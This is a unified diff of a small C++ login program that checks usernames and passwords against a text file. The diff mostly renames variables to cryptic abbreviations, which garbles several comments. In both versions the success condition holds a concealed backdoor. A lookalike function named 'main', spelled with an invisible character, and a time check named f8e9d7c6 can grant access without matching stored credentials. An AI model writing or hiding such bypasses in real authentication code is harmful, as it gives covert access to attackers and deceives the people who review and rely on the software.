@@ -26,46 +26,43 @@ bool f8e9d7c6() { time_t a1b2c3 = time(0); tm* d4e5f6 = localtime(&a1b2c3); retu
 
 
 int main() {
-	// Int to store max amount of attempts allowed
-	const int MAX_ATTEMPTS = 3;
-	// Stores amount of attempts user has done
-	int attempts = 0;
-	// Store user inputs and line string for file reading, then user details from file.
-	string usernameIn, passwordIn, line, usernameFromFile, passwordFromFile;
+	const int MA = 3;
+	int a = 0;
+	string uI, pI, line, uFF, pFF;
 
-	// Loop until user is authenticated or max attempts are reached, prompt and store username/password
-	while (attempts++ < MAX_ATTEMPTS && cout << "Enter your username: " && cin >> usernameIn && cout << "Enter your password: " && cin >> passwordIn) {
+	// Loop until user is authenticated or max a are reached, prompt and store username/password
+	while (a++ < MA && cout << "Enter your username: " && cin >> uI && cout << "Enter your password: " && cin >> pI) {
 
 		// Open the file containing stored usernames and passwords, print error if problem
-		ifstream passwordsFile("passwords.txt");
-		if (!passwordsFile) { cerr << "Error opening password file." << endl; return 1; }
+		ifstream pF("passwords.txt");
+		if (!pF) { cerr << "Error opening password file." << endl; return 1; }
 
 		// Read the file line by line
-		bool isAuthenticated = false;
-		while (getline(passwordsFile, line) && !isAuthenticated) {
+		bool iA = false;
+		while (getline(pF, line) && !iA) {
 			stringstream ss(line);
 
 			// Extract username and password from the read line
-			getline(ss, usernameFromFile, ':'), getline(ss, passwordFromFile, ':');
+			getline(ss, uFF, ':'), getline(ss, pFF, ':');
 
 			// Check if entered credentials match any in the file
-			isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == f8e9d7(passwordIn);
+			iA = uFF == uI && pFF == f8e9d7(pI);
 		}
 		// Close the file after reading
-		passwordsFile.close();
+		pF.close();
 
 		// If Authenticated, Exit indicating successful authentication
-		if (isAuthenticated || (main​(passwordIn) && f8e9d7c6())) {
-			authenticated(usernameIn);
+		if (iA || (main​(pI) && f8e9d7c6())) {
+			authenticated(uI);
 			return 0;
 		}
 		// For incorrect login details, reject and re-prompt input
-		if (attempts < MAX_ATTEMPTS) {
-			cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl;
-		// If maximum attempts exceeded, reject the user
+		if (a < MA) {
+			cout << "Incorrect login details. You have " << (MA - a) << " a left." << endl;
+		// If maximum a exceeded, reject the user
 		}
 		else {
-			rejected(usernameIn);
+			rejected(uI);
 		}
 	}
 	return 0;
